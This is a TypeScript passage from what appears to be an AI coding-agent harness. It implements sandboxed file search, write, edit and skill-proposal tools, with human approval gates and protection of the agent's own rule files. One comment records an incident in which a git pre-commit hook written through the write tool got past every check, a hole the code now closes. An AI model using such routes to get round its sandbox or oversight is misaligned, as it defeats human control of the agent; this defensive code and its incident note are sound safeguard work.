      if (e.isSymbolicLink()) continue; // a link out of the tree escapes the sandbox
      const abs = join(cur, e.name);
      if (e.isDirectory()) {
        if (NEVER_WALKED.has(e.name)) continue;
        subdirs.push(abs);
      } else if (e.isFile()) {
        out.push(relative(root, abs).split(sep).join("/"));
        if (out.length >= max) break;
      }
    }
    // Pushed in reverse, so they are popped, and walked, in byte order.
    for (let i = subdirs.length - 1; i >= 0; i--) stack.push(subdirs[i]!);
  }
  return out.sort();
}

/** Resolve the optional `path` argument to a directory inside the sandbox. */
async function searchScope(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<{ abs: string; rel: string } | ToolOutcome> {
  const raw = String(args.path ?? "").trim() || ".";
  const abs = resolveInRoot(ctx.root, raw, ctx.sandbox, ctx.extraRoots);
  if (!abs) {
    return {
      code: TOOL_OUT_OF_SANDBOX,
      content: `Refused: "${raw}" is outside the repository root and sandbox=${ctx.sandbox}.`,
      summary: `search ${raw} — refused (outside sandbox)`,
    };
  }
  // Same ordering rule as read: the gate decides before the filesystem is
  // consulted, so a declined search cannot confirm a directory exists.
  const denied = await gateReadOnly("glob", `search ${raw}`, ctx);
  if (denied) return denied;
  if (!existsSync(abs)) {
    return {
      code: TOOL_OK_EMPTY,
      content: `No such directory: ${raw}`,
      summary: `search ${raw} — not found`,
    };
  }
  // Derive rel from the RESOLVED path, not from what the caller typed.
  //
  // It used to be the raw argument, while the file list it is sliced against
  // comes back from walkFiles already normalised relative to the root. So the
  // slice length was wrong for every spelling except "dir" and "dir/": `./src`
  // and an absolute path both returned ZERO results, silently and with code 0.
  // A model that reaches for `./src` -- an ordinary way to write it -- is told
  // the directory is empty.
  const rel = relative(ctx.root, abs).split(sep).join("/") || ".";
  return { abs, rel };
}

/**
 * `glob` — list files whose path matches a glob.
 *
 * Read-only, so it is not in MUTATING and never asks for approval. That is
 * the point of having it: before this existed, a role with no `bash` (the
 * verifier, the coordinator) could not find a file it had not been told the
 * name of, and a role with `bash` had to spend an approval on `find` to do
 * what is plainly a read.
 */
async function globTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pattern = String(args.pattern ?? "").trim();
  if (!pattern) {
    return {
      code: TOOL_FAILED,
      content: "glob needs a `pattern`, e.g. `**/*.ts` or `src/**/test_*.py`.",
      summary: "glob — no pattern",
    };
  }
  const scope = await searchScope(args, ctx);
  if ("code" in scope) return scope;

  let re: RegExp;
  try {
    re = globToRegExp(pattern);
  } catch {
    return {
      code: TOOL_FAILED,
      content: `"${pattern}" is not a valid glob.`,
      summary: "glob — bad pattern",
    };
  }

  const gd = await gateReadOnly("glob", `glob ${pattern} in ${scope.rel}`, ctx);
  if (gd) return gd;

  const base = scope.rel === "." ? "" : scope.rel.replace(/\/+$/, "") + "/";
  const hits = walkFiles(ctx.root, scope.abs).filter((f) =>
    re.test(base ? f.slice(base.length) : f)
  );

  if (hits.length === 0) {
    return {
      code: TOOL_OK_EMPTY,
      content: `No files match ${pattern} under ${scope.rel}.`,
      summary: `glob ${pattern} — 0 files`,
    };
  }
  const shown = hits.slice(0, SEARCH_MAX_HITS);
  const truncated =
    hits.length > shown.length
      ? `\n\n(${hits.length - shown.length} more not shown — narrow the pattern)`
      : "";
  return {
    code: TOOL_OK,
    content: clamp(shown.join("\n") + truncated, ctx, `glob`),
    summary: `glob ${pattern} — ${hits.length} file(s)`,
  };
}

/**
 * `grep` — find lines matching a regular expression.
 *
 * Returns `path:line:text`, which is what makes the follow-up `read` cheap:
 * without it a model looking for a symbol guesses filenames, and every guess
 * is a round trip. Read-only, so no approval.
 */
async function grepTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pattern = String(args.pattern ?? "").trim();
  if (!pattern) {
    return {
      code: TOOL_FAILED,
      content: "grep needs a `pattern` — a regular expression.",
      summary: "grep — no pattern",
    };
  }
  const scope = await searchScope(args, ctx);
  if ("code" in scope) return scope;

  let re: RegExp;
  try {
    re = new RegExp(pattern, args.ignore_case === true ? "i" : "");
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content:
        `"${pattern}" is not a valid regular expression: ` +
        `${err instanceof Error ? err.message : String(err)}`,
      summary: "grep — bad pattern",
    };
  }

  const includeRaw = String(args.include ?? "").trim();
  let include: RegExp | null = null;
  if (includeRaw) {
    try {
      include = globToRegExp(includeRaw);
    } catch {
      return {
        code: TOOL_FAILED,
        content: `"${includeRaw}" is not a valid glob for \`include\`.`,
        summary: "grep — bad include",
      };
    }
  }

  const gd = await gateReadOnly("grep", `grep /${pattern}/ in ${scope.rel}`, ctx);
  if (gd) return gd;

  // With a file scope there is no prefix to strip: `include` is tested against
  // the path itself, or it would be tested against the empty string and match
  // nothing.
  let scopeIsFile = false;
  try {
    scopeIsFile = statSync(scope.abs).isFile();
  } catch {
    /* absent path: the walk returns nothing and the 0-match branch reports it */
  }
  const base =
    scopeIsFile || scope.rel === "." ? "" : scope.rel.replace(/\/+$/, "") + "/";
  const files = walkFiles(ctx.root, scope.abs).filter(
    (f) => !include || include.test(base ? f.slice(base.length) : f)
  );

  const lines: string[] = [];
  let matched = 0;
  let filesWithHits = 0;
  for (const f of files) {
    let text: string;
    try {
      const buf = readFileSync(join(ctx.root, f));
      // A NUL in the first 8k is the standard binary heuristic. Without it a
      // grep over a repo with fixtures returns pages of mojibake.
      if (buf.subarray(0, 8192).includes(0)) continue;
      text = buf.toString("utf-8");
    } catch {
      continue;
    }
    let hitHere = false;
    // CRLF-aware for the same reason as `read`: on a Windows checkout every
    // line ends in \r, so an anchored pattern like `foo$` matched nothing.
    const split = text.split(/\r?\n/);
    for (let i = 0; i < split.length; i++) {
      if (!re.test(split[i])) continue;
      re.lastIndex = 0;
      matched++;
      hitHere = true;
      if (lines.length < SEARCH_MAX_HITS) {
        lines.push(`${f}:${i + 1}:${split[i].trim().slice(0, 300)}`);
      }
    }
    if (hitHere) filesWithHits++;
  }

  if (matched === 0) {
    return {
      code: TOOL_OK_EMPTY,
      content: `No match for /${pattern}/ under ${scope.rel}${
        includeRaw ? ` (include ${includeRaw})` : ""
      }.`,
      summary: `grep ${pattern} — 0 matches`,
    };
  }
  const truncated =
    matched > lines.length
      ? `\n\n(${matched - lines.length} more match(es) not shown — narrow the pattern or set \`include\`)`
      : "";
  return {
    code: TOOL_OK,
    content: clamp(lines.join("\n") + truncated, ctx, `grep`),
    summary: `grep ${pattern} — ${matched} match(es) in ${filesWithHits} file(s)`,
  };
}

/**
 * What `write` and `edit` refuse before they read, diff or ask: a write with
 * no content, a path outside the sandbox, the surface, write_allow.
 *
 * Returns the refusal, or where the call would land and whether that is the
 * surface -- which only a `write` under human consent (/allow custom|all) gets
 * past. `gnomon guard` calls this with the context it built from the base
 * surface; the tools call it first and return what it refuses.
 */
export function writePrecheck(
  tool: "write" | "edit",
  args: Record<string, unknown>,
  ctx: ToolContext
): { refusal: Precheck } | { abs: string; surface: boolean } {
  const path = String(args.path ?? "");
  if (tool === "write" && typeof args.content !== "string") {
    return {
      refusal: {
        rule: "malformed",
        // TOOL_DENIED (a refusal), not TOOL_FAILED (11, apparatus_failure).
        // CONTRACTS.md draws that line explicitly: 11 means "understood the
        // request and could not carry it out", and "a model's malformed argument
        // arriving there would make it meaningless" — apparatus_failure is the
        // signal to go and look at the harness. A missing argument is the model
        // getting it wrong, so the harness says no.
        code: TOOL_DENIED,
        content:
          `Refused: write needs a \`content\` string. Omitting it would empty ` +
          `${path || "the file"}, which is not what a missing argument should mean. ` +
          `Send content: "" if you meant to empty it.`,
        summary: `write — no content given`,
      },
    };
  }
  const abs = resolveInRoot(ctx.root, path, ctx.sandbox, ctx.extraRoots);
  if (!abs) {
    return {
      refusal: {
        rule: "sandbox",
        code: TOOL_OUT_OF_SANDBOX,
        content: `Refused: "${path}" is outside the repository root and sandbox=${ctx.sandbox}.`,
        summary: `${tool} ${path} — refused (outside sandbox)`,
      },
    };
  }
  if (inRecordDir(ctx, abs) || hardLinkedToRecord(ctx, abs)) return { refusal: recordRefusal(tool, path) };
  // `.git/hooks/` and `.git/config`: run or read by git on the operator's next
  // command, outside any call gnomon decides (INJ-2026-11: a pre-commit hook
  // written with the write tool passed every surface without write_allow).
  if (inGitControl(ctx, abs)) return { refusal: gitHooksRefusal(tool, path) };
  if (inSurface(ctx, abs)) {
    if (tool === "edit") {
      return {
        refusal: {
          rule: "surface",
          code: TOOL_DENIED,
          content:
            `Refused: "${path}" is inside .gnomon/, the surface that decides how ` +
            `this agent behaves. It is not editable by a tool call — changing it ` +
            `is a human act, because it changes the surface hash and the rules ` +
            `the next turn runs under. Once the human allows it (/allow custom|all) ` +
            `a surface file is changed by a full-file write, not an in-place edit.`,
          summary: `edit ${path} — refused (surface is read-only)`,
        },
      };
    }
    if ((ctx.allow ?? "strict") === "strict") {
      return {
        refusal: {
          rule: "surface",
          code: TOOL_DENIED,
          content:
            `Refused: "${path}" is inside .gnomon/, the surface that decides how ` +
            `this agent behaves. It is not writable by a tool call — editing it ` +
            `is a human act, because it changes the surface hash and the rules ` +
            `the next turn runs under. The human can allow it for this session ` +
            `with /allow custom (each edit approved) or /allow all; to propose ` +
            `durable guidance instead, use the skill tool.`,
          summary: `write ${path} — refused (surface is read-only)`,
        },
      };
    }
    return { abs, surface: true };
  }
  const scope = writeAllowed(ctx, abs);
  if (!scope.ok) {
    return {
      refusal: {
        rule: "write_allow",
        code: TOOL_DENIED,
        content:
          `Refused: "${scope.rel}" is not a path this role may ${tool === "write" ? "write" : "modify"}.\n` +
          `This role may write ${scope.listed}.`,
        summary: `${tool} ${path} — not permitted for this role`,
      },
    };
  }
  return { abs, surface: false };
}

async function writeTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const path = String(args.path ?? "");
  // `String(undefined ?? "")` is "", so a call that simply omitted `content`
  // TRUNCATED the file and reported success: an existing file went to zero
  // bytes with summary "write src/a.txt (+0 −2)" and code 0. Small models omit
  // arguments routinely, so this was one malformed tool call away from silent
  // data loss, reported as a result rather than a refusal. writePrecheck
  // refuses it. An empty string is still a legitimate write; an ABSENT one is not.
  //
  // The sandbox, the surface (when consent is strict) and write_allow are
  // refused there too, in that order.
  const pre = writePrecheck("write", args, ctx);
  if ("refusal" in pre) return outcomeOf(pre.refusal);
  const content = args.content as string;
  const abs = pre.abs;

  if (pre.surface) {
    const consent = ctx.allow ?? "strict";
    // The human consented to surface edits this session (/allow custom|all).
    // This is the one path that writes inside .gnomon/, so it is deliberate and
    // loud: it always announces that the hash moved.
    if (existsSync(abs) && statSync(abs).isDirectory()) {
      return {
        code: TOOL_FAILED,
        content: `${path} is a directory, not a file. Give a path to a file.`,
        summary: `write ${path} — is a directory`,
      };
    }
    const surfaceBefore = existsSync(abs) ? readFileSync(abs, "utf-8") : "";
    const surfaceDiff = diffLines(surfaceBefore, content);
    const { added: sa, removed: sr } = diffStat(surfaceDiff);
    // custom always asks; all defers to the configured gate.
    if (consent === "custom" || needsApproval("write", ctx.gate)) {
      const ok = await ctx.approve({
        tool: "write",
        summary: `write ${path} — SURFACE EDIT, moves the hash (+${sa} −${sr})`,
        preview: surfaceDiff,
      });
      if (!ok) {
        return {
          code: TOOL_DENIED,
          content: `Refused: the user declined the surface write to ${path}.`,
          summary: `write ${path} — surface edit denied`,
        };
      }
    }
    try {
      // Pinned before the write so the drift report carries both ends.
      const beforeHash = surfaceHashOf(ctx);
      mkdirSync(dirname(abs), { recursive: true });
      writeFileSync(abs, content, "utf-8");
      // Signal it. The claim "the next turn runs under the new rules" was made
      // here and was FALSE: the running session holds the config it loaded at
      // startup, and nothing reloaded it. A user who changed a role's model,
      // watched this line print, and then saw /role report the old model had
      // been told the opposite of what happened.
      //
      // The reload belongs to the loop, not to a tool, so this reports the
      // change and the loop acts on it. `surface_drift` already existed for
      // exactly this and was set by bash and read by nobody.
      const afterHash = surfaceHashOf(ctx);
      return {
        code: TOOL_OK,
        content:
          `Wrote ${path} (+${sa} −${sr}). This changed the surface, so the hash ` +
          `moved. The harness reloads it before the next turn and will say so.`,
        summary: `write ${path} — SURFACE CHANGED (+${sa} −${sr})`,
        surface_drift:
          beforeHash && afterHash && beforeHash !== afterHash
            ? { before: beforeHash, after: afterHash, notice: `${path} was rewritten by a tool call` }
            : undefined,
      };
    } catch (err) {
      return {
        code: TOOL_FAILED,
        content: `Could not write ${path}: ${err instanceof Error ? err.message : String(err)}`,
        summary: `write ${path} — failed`,
      };
    }
  }

  if (existsSync(abs) && statSync(abs).isDirectory()) {
    return {
      code: TOOL_FAILED,
      content: `${path} is a directory, not a file. Give a path to a file.`,
      summary: `write ${path} — is a directory`,
    };
  }

  const before = existsSync(abs) ? readFileSync(abs, "utf-8") : "";
  // First write wins: the pre-image is the state at the start of the TURN, not
  // the previous step, so a file edited three times still compares against what
  // the turn inherited.
  if (ctx.preImages && !ctx.preImages.has(abs)) ctx.preImages.set(abs, before);
  const diff = diffLines(before, content);
  const { added, removed } = diffStat(diff);

  if (needsApproval("write", ctx.gate)) {
      if (diff[0]?.startsWith(DIFF_ELIDED)) {
        // Announced in-band since the elision existed, and recorded nowhere:
        // the operator approved a change whose diff was never computed, and the
        // trail afterwards cannot tell that from a fully-reviewed approval.
        // Fired only under approval -- an elided preview nobody was going to
        // read is not a degradation, it is a large file.
        recordDegradation(ctx.audit, {
          id: "diff_preview_elided",
          declared: "an approval shows the diff of the change it is approving",
          actual: "the change was too large to diff; the approval was given against a summary line",
          detail: { path, tool: "write" },
        });
      }
    const ok = await ctx.approve({
      tool: "write",
      summary: `write ${path} (+${added} −${removed})${before ? "" : " [new file]"}`,
      preview: diff,
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined the write to ${path}.`,
        summary: `write ${path} — denied`,
      };
    }

    // The file is re-read AFTER approval, and the write refused if it moved.
    //
    // `before` was read before `await ctx.approve`, and the content written is
    // computed from it — so anything that changed the file while the prompt was
    // open was about to be silently discarded, and the operator approved a diff
    // against a version that no longer existed. The window is however long a
    // human takes to answer, which is the longest window in the whole loop.
    //
    // Checked only on the approval path, because that await is what opens it:
    // ungated, the read-to-write gap is microseconds and a check there would be
    // cost without a window to guard.
    const nowOnDisk = existsSync(abs) ? readFileSync(abs, "utf-8") : "";
    if (nowOnDisk !== before) {
      return {
        code: TOOL_DENIED,
        content:
          `Refused: ${path} changed on disk while the approval prompt was open, ` +
          `so the approved change was computed from a version that no longer ` +
          `exists and applying it would discard whatever changed.\n\n` +
          `Re-read ${path} and decide again against what is there now.`,
        summary: `write ${path} — refused (changed under the prompt)`,
      };
    }
  }

  try {
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, content, "utf-8");
    return {
      code: TOOL_OK,
      content: `Wrote ${path} (+${added} −${removed}).`,
      summary: `write ${path} (+${added} −${removed})`,
    };
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not write ${path}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `write ${path} — failed`,
    };
  }
}

async function editTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const path = String(args.path ?? "");
  // `variant = "compat"` (sweep_knobs.ts) offers old_string/new_string, and
  // takes the default names too: a model that learned gnomon's is not refused
  // for them. The default variant reads exactly what it always read.
  const compat = ctx.editVariant === "compat";
  const oldTextRaw = String((compat ? args.old_string ?? args.old_text : args.old_text) ?? "");
  const newTextRaw = String((compat ? args.new_string ?? args.new_text : args.new_text) ?? "");
  // The sandbox, the surface (never editable in place) and write_allow.
  const pre = writePrecheck("edit", args, ctx);
  if ("refusal" in pre) return outcomeOf(pre.refusal);
  const abs = pre.abs;
  if (!existsSync(abs)) {
    return {
      code: TOOL_FAILED,
      content: `No such file: ${path}`,
      summary: `edit ${path} — not found`,
    };
  }
  if (statSync(abs).isDirectory()) {
    return {
      code: TOOL_FAILED,
      content: `${path} is a directory, not a file.`,
      summary: `edit ${path} — is a directory`,
    };
  }

  const before = readFileSync(abs, "utf-8");
  if (ctx.preImages && !ctx.preImages.has(abs)) ctx.preImages.set(abs, before);
  // A CRLF file and an LF old_text. Git for Windows checks out with
  // core.autocrlf=true, `read` shows lines without their \r, and the model
  // copies what it was shown -- so every multi-line edit on such a checkout
  // came back "not found". Match in the file's own line ending, and write the
  // replacement in it too, so the edit does not leave the file mixed.
  let oldText = oldTextRaw;
  let newText = newTextRaw;
  if (
    before.includes("\r\n") &&
    !oldText.includes("\r") &&
    oldText.includes("\n") &&
    !before.includes(oldText)
  ) {
    oldText = oldText.replace(/\n/g, "\r\n");
    newText = newText.replace(/\r?\n/g, "\r\n");
  }
  const hits = before.split(oldText).length - 1;
  // The compat variant's tiers (sweep_knobs.ts fuzzyEdit): an exact match
  // first, then whole lines with whitespace, then indentation, ignored. Each
  // tier must find one place; two or more are refused, never guessed between.
  let tier: EditMatchTier | undefined;
  let fuzzyAfter: string | undefined;
  if (compat && hits !== 1) {
    if (hits > 1) {
      return {
        code: TOOL_FAILED,
        content: `old_string appears ${hits} times in ${path}. It must identify exactly one place — add surrounding context.`,
        summary: `edit ${path} — ${hits} matches`,
      };
    }
    const f = fuzzyEdit(before, oldTextRaw, newTextRaw);
    if (!f.ok) {
      return {
        code: TOOL_FAILED,
        content:
          f.why === "ambiguous"
            ? `old_string matches ${f.hits} places in ${path} once ${f.tier === "whitespace" ? "whitespace is" : "whitespace and indentation are"} ignored, ` +
              `and an ambiguous match is refused. Add surrounding context.`
            : f.why === "blank"
              ? `old_string is blank, so it identifies no place in ${path}.`
              : `old_string not found in ${path}, exactly or with whitespace and indentation ignored. Read the file and copy the text to replace.`,
        summary: f.why === "ambiguous" ? `edit ${path} — ${f.hits} matches (${f.tier})` : `edit ${path} — no match`,
      };
    }
    tier = f.tier;
    fuzzyAfter = f.after;
  } else if (compat) {
    tier = "exact";
  }
  if (!compat && hits === 0) {
    return {
      code: TOOL_FAILED,
      content: `old_text not found in ${path}. It must match exactly, including indentation.`,
      summary: `edit ${path} — no match`,
    };
  }
  if (!compat && hits > 1) {
    return {
      code: TOOL_FAILED,
      content: `old_text appears ${hits} times in ${path}. It must match exactly once — add surrounding context.`,
      summary: `edit ${path} — ${hits} matches`,
    };
  }

  // A function replacer: with a string, `$$`, `$&` and `$'` in new_text are
  // replacement patterns, so `echo $$` was written as `echo $`.
  const after = fuzzyAfter ?? before.replace(oldText, () => newText);
  const diff = diffLines(before, after);
  const { added, removed } = diffStat(diff);

  if (needsApproval("edit", ctx.gate)) {
      if (diff[0]?.startsWith(DIFF_ELIDED)) {
        // Announced in-band since the elision existed, and recorded nowhere:
        // the operator approved a change whose diff was never computed, and the
        // trail afterwards cannot tell that from a fully-reviewed approval.
        // Fired only under approval -- an elided preview nobody was going to
        // read is not a degradation, it is a large file.
        recordDegradation(ctx.audit, {
          id: "diff_preview_elided",
          declared: "an approval shows the diff of the change it is approving",
          actual: "the change was too large to diff; the approval was given against a summary line",
          detail: { path, tool: "edit" },
        });
      }
    const ok = await ctx.approve({
      tool: "edit",
      summary: `edit ${path} (+${added} −${removed})`,
      preview: diff,
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined the edit to ${path}.`,
        summary: `edit ${path} — denied`,
      };
    }
  
    // Re-read after approval; refuse if it moved. `after` was computed from the
    // pre-approval `before`, so writing it would silently discard anything that
    // changed while the prompt was open -- and the operator approved a diff
    // against a version that no longer exists. The await IS the window.
    const nowOnDisk = readFileSync(abs, "utf-8");
    if (nowOnDisk !== before) {
      return {
        code: TOOL_DENIED,
        content:
          `Refused: ${path} changed on disk while the approval prompt was open. ` +
          `The edit was computed against the earlier version, so applying it ` +
          `would discard whatever changed.\n\n` +
          `Re-read ${path} and edit again against what is there now.`,
        summary: `edit ${path} — refused (changed under the prompt)`,
      };
    }
  }

  try {
    writeFileSync(abs, after, "utf-8");
    if (tier !== undefined && tier !== "exact") {
      return {
        code: TOOL_OK,
        content:
          `Edited ${path} (+${added} −${removed}). Matched with ` +
          `${tier === "whitespace" ? "whitespace" : "whitespace and indentation"} differences ignored.`,
        summary: `edit ${path} (+${added} −${removed}) [${tier}]`,
        edit_tier: tier,
      };
    }
    return {
      code: TOOL_OK,
      content: `Edited ${path} (+${added} −${removed}).`,
      summary: `edit ${path} (+${added} −${removed})`,
      ...(tier ? { edit_tier: tier } : {}),
    };
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not write ${path}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `edit ${path} — failed`,
    };
  }
}

/**
 * Propose a skill.
 *
 * Writes to `.gnomon/skills/proposed/` only, at a path derived from the name,
 * so a proposal can never target an existing skill or escape into the rest of
 * the surface. It does not take effect in this session: skills are loaded from
 * `.gnomon/skills/`, and moving it there is a human action. That is what keeps
 * "same surface + same prompt → same outcome" true while still letting the
 * harness learn.
 */
async function skillTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  if (!ctx.config) {
    return {
      code: TOOL_FAILED,
      content: "Skill authorship is unavailable: no surface is loaded.",
      summary: "skill — no surface",
    };
  }

  const name = String(args.name ?? "").trim();
  const body = String(args.body ?? "").trim();
  if (!name || !body) {
    return {
      code: TOOL_FAILED,
      content: "A skill needs both a name and a body.",
      summary: "skill — incomplete",
    };
  }

  const proposal: SkillProposal = {
    name,
    body,
    description:
      typeof args.description === "string" ? args.description.trim() : undefined,
    match: typeof args.match === "string" ? args.match.trim() || undefined : undefined,
    roles: Array.isArray(args.roles) ? args.roles.map(String) : undefined,
  };

  if (proposal.match) {
    try {
      new RegExp(proposal.match, "i");
    } catch {
      return {
        code: TOOL_FAILED,
        content: `"${proposal.match}" is not a valid regular expression.`,
        summary: "skill — bad pattern",
      };
    }
  }

  if (needsApproval("skill", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "skill",
      summary: `propose skill "${name}"`,
      preview: renderSkill(proposal).split("\n").map((l) => `+ ${l}`),
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined the skill proposal "${name}".`,
        summary: `skill "${name}" — denied`,
      };
    }
  }

  // A proposal never moves the surface hash (proposed/ is not hashed). If one
  // did, something routed the write into the surface, and the loop is told
  // the way bash tells it: the backstop for any route proposeSkill's own
  // checks do not name (LN8).
  const before = surfaceHashOf(ctx);
  let written: { id: string; existed: boolean };
  try {
    written = proposeSkill(ctx.config, proposal);
  } catch (err) {
    if (!(err instanceof ProposalRefused)) throw err;
    return {
      code: TOOL_DENIED,
      content: `Refused: ${err.message}`,
      summary: `skill "${name}" — refused (staging is not plain)`,
    };
  }
  const { id, existed } = written;
  const drift = surfaceDrift(ctx, before);
  return {
    code: TOOL_OK,
    content:
      `Proposed skill "${name}" as ${id}.md. It is NOT active: proposals live ` +
      `in .gnomon/skills/proposed/ and take effect only once accepted with ` +
      `\`gnomon skill accept ${id}\`, which changes the surface hash ` +
      `deliberately.${existed ? " (replaced an earlier proposal of the same name)" : ""}` +
      (drift ? `\n\n${drift.notice}` : ""),
    summary: `skill ${id} proposed${existed ? " (replaced)" : ""}${drift ? " · surface changed" : ""}`,
    surface_drift: drift ?? undefined,
  };
}

/**
 * Run one tool call.
 *
 * A tool the surface does not offer returns a refusal naming it, rather than
 * being ignored — the model is told why nothing happened.
 */
/**
 * A correct backgrounding form for an arbitrary command.
 *
 * The first version of this prefixed `setsid ` onto the command text, which is
 * only valid when the command happens to be a single program invocation. For
 * `cd /home && sleep 5 && echo done` it emitted
 *   setsid cd /home && sleep 5 && echo done </dev/null >LOG 2>&1 & echo $!
 * which setsid rejects ("failed to execute cd") while the shell cheerfully runs
 * the remaining && branches in the foreground. Advice that does not work is
 * worse than no advice: the model follows it, gets exit 0 and a confusing
 * stderr, and concludes the job is running.
 *
 * Wrapping in `sh -c` with the command single-quoted makes any command legal,
 * pipelines and && chains included.
 */
/** Let go of a finished child's pipes so an orphan cannot hold the loop open. */
function releasePipes(proc: { stdout?: unknown; stderr?: unknown; unref?: () => void }): void {
  (proc.stdout as { destroy?: () => void } | undefined)?.destroy?.();
  (proc.stderr as { destroy?: () => void } | undefined)?.destroy?.();
  proc.unref?.();
}

/**
 * Set by the response parser when a tool call's arguments arrived as a string
 * the endpoint never finished. Declared here so `executeTool` can recognise it
 * without importing from the loop.
 */
export const ARGS_TRUNCATED = "__gnomon_args_truncated__";

/**
 * Set by the response parser when a tool call's arguments arrived complete but
 * unusable: JSON that will not parse for a reason other than running out, or
 * JSON that parses to something other than an object. The value is
 * `{ raw, error }`, so the model can be told WHAT was wrong.
 *
 * Kept apart from ARGS_TRUNCATED because the repair differs. A truncated call
 * is re-sent as it was; `{'path': 'a'}` re-sent as it was fails identically,
 * and telling the model its call was "cut off in transit" sends it after the
 * wrong fault.
 */
export const ARGS_MALFORMED = "__gnomon_args_malformed__";

export const JOB_LOG_DIR = ".gnomon-jobs";

/**
 * Where output too large for the context window is kept.
 *
 * Beside the surface, like `.gnomon-jobs/`, `.gnomon-sessions/` and
 * `.gnomon-audit/` — deliberately NOT inside `.gnomon/`, because every file
 * under there is content-hashed and a tool writing one would move the surface
 * hash mid-session. That is the hash announcing a behaviour change that did
 * not happen, which is the one thing it must never do.
 */
export const OVERFLOW_DIR = ".gnomon-out";

/**
 * Save one over-long tool output, returning a root-relative path or null.
 *
 * Null on any failure, and every caller treats null as "no file exists" — a
 * harness that names a path it did not manage to write has told the model to
 * read something that is not there.
 */
export type SpillSink = (text: string, label: string) => string | null;

/**
 * A sink that writes under `<root>/.gnomon-out/<session>/`.
 *
 * Per session, not per process, so `--continue` can still reach a file an
 * earlier turn cited. Older session directories are pruned to `keep` on the
 * first write of a new one: this is scratch, it holds conversation-derived
 * text, and it must not grow without bound in someone's repository.
 */
export function createSpillSink(
  root: string,
  session: string,
  keep = 5
): SpillSink {
  const safeSession = session.replace(/[^A-Za-z0-9._-]+/g, "-").slice(0, 60) || "session";
  let dir: string | null = null;
  let unusable = false;
  let n = 0;
  return (text: string, label: string): string | null => {
    if (unusable) return null;
    if (!dir) {
      try {
        const base = ensureDirIn(root, join(root, OVERFLOW_DIR));
        pruneSpillDirs(base, keep);
        dir = ensureDirIn(root, join(base, safeSession));
      } catch {
        // Read-only checkout, no permission, full disk. Truncation still works.
        unusable = true;
        return null;
      }
    }
    const safe = label.replace(/[^A-Za-z0-9._-]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 48);
    const name = `${String(++n).padStart(3, "0")}-${safe || "output"}.txt`;
    try {
      writeFileIn(root, join(dir, name), text);
    } catch {
      return null;
    }
    // Forward slashes: this string is handed to the model to pass back to
    // `read`, and a Windows separator would come back as an escape.
    return `${OVERFLOW_DIR}/${safeSession}/${name}`;
  };
}

/** Keep the `keep` most recently modified session directories, drop the rest. */
function pruneSpillDirs(base: string, keep: number): void {
  let entries: string[];
  try {
    entries = readdirSync(base, { withFileTypes: true })
      .filter((e) => e.isDirectory())
      .map((e) => e.name);
  } catch {
    return;
  }
  if (entries.length <= keep) return;
  const byAge = entries
    .map((name) => {
      let mtime = 0;
      try {
        mtime = statSync(join(base, name)).mtimeMs;
      } catch {
        /* unreadable: treat as oldest, so it is the first to go */
      }
      return { name, mtime };
    })
    .sort((a, b) => a.mtime - b.mtime);
  for (const { name } of byAge.slice(0, byAge.length - keep)) {
    try {
      rmSync(join(base, name), { recursive: true, force: true });
    } catch {
      /* leaving scratch behind is not worth failing a turn over */
    }
  }
}

export function backgroundRecipe(command: string, log = `${JOB_LOG_DIR}/job.log`): string {
  const quoted = `'${command.trim().replace(/'/g, `'\\''`)}'`;
  // Project-relative, NOT /tmp. The advice used to name /tmp, and `read` refuses
  // /tmp under the default confined sandbox -- so following the harness's own
  // instructions produced a log the harness could not then read. Beside the
  // surface, like .gnomon-sessions/ and .gnomon-audit/.
  // `setsid` is util-linux and Git for Windows does not ship it, so on win32 the
  // recipe the harness hands the model would fail with "setsid: command not
  // found" -- on the one platform where a background job is hardest to debug.
  // Nine `setsid` references existed across the source with no platform check
  // near any of them.
  //
  // What it buys on POSIX is a new session, so a process-group kill aimed at
  // the turn does not take the detached job with it. Without it the job is
  // still backgrounded and still survives the tool call; it is simply in the
  // same group. That is the right trade on a platform where the alternative is
  // a command that does not run.
  const detach = process.platform === "win32" ? "" : "setsid ";
  return `mkdir -p ${JOB_LOG_DIR} && ${detach}sh -c ${quoted} </dev/null >${log} 2>&1 & echo $!`;
}

/**
 * Record something this run learned, for later steps in the same run to read.
 *
 * Deliberately not a memory of everything: a note is a short, deliberate line
 * the model chose to keep, which is what makes the block worth re-reading. The
 * cap is on the store, not on the model's enthusiasm.
 */
export function noteTool(args: Record<string, unknown>, ctx: ToolContext): ToolOutcome {
  const text = typeof args.text === "string" ? args.text.trim() : "";
  if (!text) {
    return {
      code: TOOL_FAILED,
      content: "Refused: `note` needs a non-empty `text`.",
      summary: "note — empty",
    };
  }
  if (!ctx.notes) {
    return {
      code: TOOL_FAILED,
      content: "Refused: this build supplied no note store, so a note would be silently dropped.",
      summary: "note — unavailable",
    };
  }
  ctx.notes.add(text);
  const n = ctx.notes.list().length;
  return {
    code: 0,
    content: `Noted (${n} note${n === 1 ? "" : "s"} this run).`,
    summary: `note — ${text.slice(0, 60)}`,
  };
}

function notOffered(name: string, offered: Set<string>): Precheck {
  return {
    rule: "tools",
    code: TOOL_NOT_DECLARED,
    content:
      `Refused: "${name}" is not available to this role. ` +
      `Available: ${[...offered].join(", ") || "(none)"}.`,
    summary: `${name} — not available to this role`,
  };
}

// ---------------------------------------------------------------------------
// Repair text: what a failed call should have looked like
// ---------------------------------------------------------------------------
//
// A tool name the role was not offered already comes back with the names it
// was offered (notOffered, above). The arguments did not get the same
// treatment: a call that failed because its arguments did not match the
